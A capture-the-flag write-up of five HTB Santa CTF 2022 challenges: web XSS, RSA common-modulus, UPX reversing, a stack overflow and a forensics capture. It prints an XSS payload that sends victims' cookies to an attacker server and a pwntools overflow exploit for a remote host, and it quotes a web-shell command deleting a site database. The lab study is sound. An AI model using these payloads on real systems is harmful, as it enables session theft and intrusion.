# HTB Santa CTF 2022

## Toy Workshop \[ Web ]

![image](https://user-images.githubusercontent.com/56447720/144388010-0a52a976-2014-4052-888c-cce6d567d3cd.png)

### Homepage

![image](https://user-images.githubusercontent.com/56447720/144388506-ffff4770-6e36-4561-ab45-2d248bae31ae.png)

* The homepage had nothing intresting

### Source Code

* `/web_toy_workshop/challenge/routes/index.js`

```js
<--SNIPPED-->

router.post('/api/submit', async (req, res) => {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() => {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

<--SNIPPED-->                    

```

* So we have to send our query ( json data ) in `/api/submit`
* It's a XSS

### Solution

```js
POST /api/submit HTTP/1.1
Host: 46.101.20.5:31726
Content-Type:application/json
Content-Length: 130

{
  "query":"<img src=x onerror=this.src='<IP>/c?'+document.cookie;>"
}

```

* I used python3 http server with ngrok ( appended the link in )

### Flag

* After you sent the the POST request to the website, It will use the query and store it in it's database, and retrive the flag ( cookie ) for us
* Start the python3 server , use ngrok , update the query

![image](https://user-images.githubusercontent.com/56447720/144390423-6ef82ec3-5eaa-4383-b371-eb8c713049e5.png)

```bash
# flag : HTB{3v1l_3lv3s_4r3_r1s1ng_up!}
```

## Common Mistake \[ Crypto ]

![image](https://user-images.githubusercontent.com/56447720/144392206-7c1df05c-1689-4b31-92ee-195227753a1d.png)

### Challenge files

* Hex values

```

{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'}

```

* Integer values

```py
n = 21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407

e1 = 65537
e2 = 35
c1 = 10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428

c2 = 15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856

```

### Solution

* The encryption flag has 2 modulus with same flag ( message )
* The attack used to get the flag is `Common Modulus Attack`
* Learn more about this attack : https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5

### Solve.py

```py

import gmpy2
from Crypto.Util.number import *


n = 21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407

e1 = 65537
e2 = 35
c1 = 10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428

c2 = 15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856

def egcd(a, b):
  if (a == 0):
    return (b, 0, 1)
  else:
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)
    
def neg_pow(a, b, n):
	assert b < 0
	assert GCD(a, n) == 1
	res = int(gmpy2.invert(a, n))
	res = pow(res, b*(-1), n)
	return res

def common_modulus(e1, e2, n, c1, c2):
	g, a, b = egcd(e1, e2)
	if a < 0:
		c1 = neg_pow(c1, a, n)
	else:
		c1 = pow(c1, a, n)
	if b < 0:
		c2 = neg_pow(c2, b, n)
	else:
		c2 = pow(c2, b, n)
	ct = c1*c2 % n
	m = int(gmpy2.iroot(ct, g)[0])
	return long_to_bytes(m)

print(common_modulus(e1, e2, n, c1, c2).decode())
```

```bash
# Flag : HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}
```

## Giftwrap \[ Reversing ]

![image](https://user-images.githubusercontent.com/56447720/149666955-e183ad60-55d9-44cc-a23a-c9c115ee7a6b.png)

**This is day 2 challenge**

### Binary Info

```bash
└─$ strings giftwrap 
<--SNIPPED-->
A	?un
G7FA	te
who1D
=ddr
}643e
Pb+4%
to]"
-id%ABI-0
2.OZo
AIX5
ot	+
.bss
!$_\
K[lbO
16 8
,6H_
^lOW
s:m/
UPX!
UPX!
             
```

* by using strings we get to know the binary is compressed by UPX
* What is UPX ?

> UPX achieves an excellent compression ratio and offers very fast decompression. Your executables suffer no memory overhead or other drawbacks for most of the formats supported, because of in-place decompression

#### Decompressing the binary

```bash
└─$ upx -d giftwrap            
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    925312 <-    357628   38.65%   linux/amd64   giftwrap

Unpacked 1 file.

```

### Analyzing Binary

```bash
└─$ ./giftwrap 
What's the magic word? asdf
Wrong password! Who are you?!?
                                    
```

* The binary is a typical crackme challenge
* Let's boot up the binary in ghidra

#### Main function

* Each character of the user input is `xored` with `0xf3`

```c
<--SNIPPED-->
printf("What\'s the magic word? ");
  __isoc99_scanf("%256s",&user_input);
  local_11c = 0;
  while (local_11c < 0x100) {
    *(byte *)((long)&user_input + (long)(int)local_11c) =
         *(byte *)((long)&user_input + (long)(int)local_11c) ^ 0xf3;
    local_11c = local_11c + 1;
  }
  iVar1 = thunk_FUN_004010e6(CHECK,&user_input,0x17);
  if (iVar1 == 0) {
    puts("Welcome inside...");
  }
  else {
    puts("Wrong password! Who are you?!?");
  }
```

* After xoring the value ( xored input ) is compared with `CHECK` variable

### Solution

* Let's the data stored in `CHECK` variable

```asm
                             CHECK                                           XREF[3]:     Entry Point(*), main:004019fa(*), 
                                                                                          main:00401a01(*)  
        004cc0f0 bb a7 b1        undefine
                 88 86 83 
                 8b ac c7 
           004cc0f0 bb              undefined1BBh                     [0]                               XREF[3]:     Entry Point(*), main:004019fa(*), 
                                                                                                                     main:00401a01(*)  
           004cc0f1 a7              undefined1A7h                     [1]
           004cc0f2 b1              undefined1B1h                     [2]
           004cc0f3 88              undefined188h                     [3]
           004cc0f4 86              undefined186h                     [4]
           004cc0f5 83              undefined183h                     [5]
           004cc0f6 8b              undefined18Bh                     [6]
           004cc0f7 ac              undefined1ACh                     [7]
           004cc0f8 c7              undefined1C7h                     [8]
           004cc0f9 c2              undefined1C2h                     [9]
           004cc0fa 9d              undefined19Dh                     [10]
           004cc0fb 87              undefined187h                     [11]
           004cc0fc ac              undefined1ACh                     [12]
           004cc0fd c6              undefined1C6h                     [13]
           004cc0fe c3              undefined1C3h                     [14]
           004cc0ff ac              undefined1ACh                     [15]
           004cc100 9b              undefined19Bh                     [16]
           004cc101 c7              undefined1C7h                     [17]
           004cc102 81              undefined181h                     [18]
           004cc103 97              undefined197h                     [19]
           004cc104 d2              undefined1D2h                     [20]
           004cc105 d2              undefined1D2h                     [21]
           004cc106 8e              undefined18Eh                     [22]
           004cc107 00              undefined100h                     [23]
```

* Let's store the `CHECK` values locally and `xor` it with `0xf3` to get flag

### solve.py

```py

check_values = 'bb a7 b1 88 86 83 8b ac c7 c2 9d 87 ac c6 c3 ac 9b c7 81 97 d2 d2 8e 00'.split(' ')
int_values = [int(i,16) for i in check_values]

flag = ''.join([chr(i ^ 0xf3) for i in int_values])
print(flag)
```

### Flag

```bash
└─$ ./giftwrap 

What's the magic word? 
HTB{upx_41nt_50_h4rd!!}ó
Welcome inside...

# flag : HTB{upx_41nt_50_h4rd!!}ó

```

## Mr Snowy \[ Pwn ]

![image](https://user-images.githubusercontent.com/56447720/144405133-fce67fce-1a26-4b8c-8d1d-4700f372a297.png)

### Solution

#### Checksec

![image](https://user-images.githubusercontent.com/56447720/144418184-a7ce15ee-4cc8-4ffa-a5b3-681002b860b7.png)

* The `NX` is enabled which makes the stack unexecutabble
* THe `PIE` is disabled so we dont have to find the address
* The binary is just a simple bufferoverflow

#### Functions of the binary has

![image](https://user-images.githubusercontent.com/56447720/144419529-fa60777f-2ee8-4d72-acd0-99e7cd4d7aba.png)

#### Main function

![image](https://user-images.githubusercontent.com/56447720/144418082-2035b197-9a54-474e-badf-c758bd8127fa.png)

* The main funciton after executing calls 3 functions , let's checkout the snowman function

**It's quiet difficult to do the task only with asm , I've used Ghidra which has a feature of converting ( almost same ) asm back to the original C code**

#### Snowman Function

```c

void snowman(void)

{
  int iVar1;
  char local_48 [64];
  
  printstr("\n[*] This snowman looks sus..\n\n1. Investigate 🔎\n2. Let it be   ⛄\n> ");
  fflush(stdout);
  read(0,local_48,2);
  iVar1 = atoi(local_48);
  if (iVar1 != 1) {
    printstr("[*] It\'s just a cute snowman after all, nothing to worry about..\n");
    color("\n[-] Mission failed!\n",&DAT_0040161a,&DAT_00401664);
                    /* WARNING: Subroutine does not return */
    exit(-0x45);
  }
  investigate();
  return;
}


```

* This code is basically the first part ![image](https://user-images.githubusercontent.com/56447720/144408636-c805745e-25eb-48a5-8e07-4c83074d5f97.png)
* When option `1` is selected it calls antoher funtion : `investigate()`

#### Inverstigate Function

```c

void investigate(void)

{
  int iVar1;
  char local_48 [64];
  
  fflush(stdout);
  printstr(
          "\n[!] After some investigation, you found a secret camera inside the snowman!\n\n1.Deactivate ⚠\xfe0f\n2. Break it   🔨\n> "
          );
  fflush(stdout);
  read(0,local_48,0x108);
  iVar1 = atoi(local_48);
  if (iVar1 == 1) {
    puts("\x1b[1;31m");
    printstr("[!] You do not know the password!\n[-] Mission failed!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  iVar1 = atoi(local_48);
  if (iVar1 == 2) {
    puts("\x1b[1;31m");
    printstr(
            "[!] This metal seems unbreakable, the elves seem to have put a spell on it..\n[-]Mission failed!\n"
            );
                    /* WARNING: Subroutine does not return */
    exit(0x16);
  }
  fflush(stdout);
  puts("\x1b[1;31m");
  fflush(stdout);
  puts("[-] Mission failed!");
  fflush(stdout);
  return;
}

```

#### There's another function named `deactivate camera`

```c

void deactivate_camera(void)

{
  char acStack104 [48];
  FILE *local_38;
  char *local_30;
  undefined8 local_28;
  int local_1c;
  
  local_1c = 0x30;
  local_28 = 0x2f;
  local_30 = acStack104;
  local_38 = fopen("flag.txt","rb");
  if (local_38 == (FILE *)0x0) {
    fwrite("[-] Could not open flag.txt, please conctact an Administrator.\n",1,0x3f,stdout);
                    /* WARNING: Subroutine does not return */
    exit(-0x45);
  }
  fgets(local_30,local_1c,local_38);
  puts("\x1b[1;32m");
  fwrite("[+] Here is the secret password to deactivate the camera: ",1,0x3a,stdout);
  puts(local_30);
  fclose(local_38);
  return;
}

```

### Overflow

* So we basically have to find the offset in investigation function, overflow it and set the `$rip` ( Instruction pointter ) to `deactivate_camera` function
* Find OFFSET
* Set breakpoint at `exit` in `investigate()` \[ address of exit : 0x00000000004013ea ] and create a pattern to find offset

![image](https://user-images.githubusercontent.com/56447720/144418424-fcdf5250-a4ce-4edc-bda1-91df1c306755.png)

* Run the program , give option `1` to go in `investigate` function

![image](https://user-images.githubusercontent.com/56447720/144418694-e1b7f129-2354-4377-b280-af26893a00cb.png)

* This is how stack will look when we hit our breakpoint

![image](https://user-images.githubusercontent.com/56447720/144416069-49db01c2-1f83-4bd7-a0f1-c340cb49f6e1.png)

![image](https://user-images.githubusercontent.com/56447720/144418590-d00fa329-4da0-4700-bcd5-dc64a899d5ae.png)

* So the OFFSET is 72

### Exploit

* Send buffer of 72 characters
* Add the addresss of `deactivate camera` function
* Send the payload and get the flag

### Solve.py

```py
from pwn import *

# nc 134.209.30.250:30947
p = remote('134.209.30.250',30947)

payload = b'A'*72
payload += p64(0x00401165)

p.recv()
p.sendline(b'1')
p.recv()
p.sendline(payload)
p.interactive()
```

### Flag

![image](https://user-images.githubusercontent.com/56447720/144417152-21dc9cc1-5c83-4db1-830c-9f4db56e2360.png)

```bash
# Flag : HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}
```

## baby APT \[ Forensics ]

![image](https://user-images.githubusercontent.com/56447720/144394496-6bd7e734-7488-44c4-9b68-ff0926e6996d.png)

### Note

* This is unintended way to do the challenge

### Solution

* Strings command showed some HTTP requets

![image](https://user-images.githubusercontent.com/56447720/144395334-ba542eba-cf63-45a3-9f99-18cd6cff1875.png)

* URL encoded

```bash
cmd=rm++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles%2F.ht.sqlite+%26%26+echo+SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59+%3E+%2Fdev%2Fnull+2%3E%261+%26%26+ls+-al++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles

```

* URL decoded

```bash
cmd=rm  /var/www/html/sites/default/files/.ht.sqlite && echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 > /dev/null 2>&1 && ls -al  /var/www/html/sites/default/files

```

### Flag

```bash
└─$ echo "SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59" | base64 -d 

HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}

```
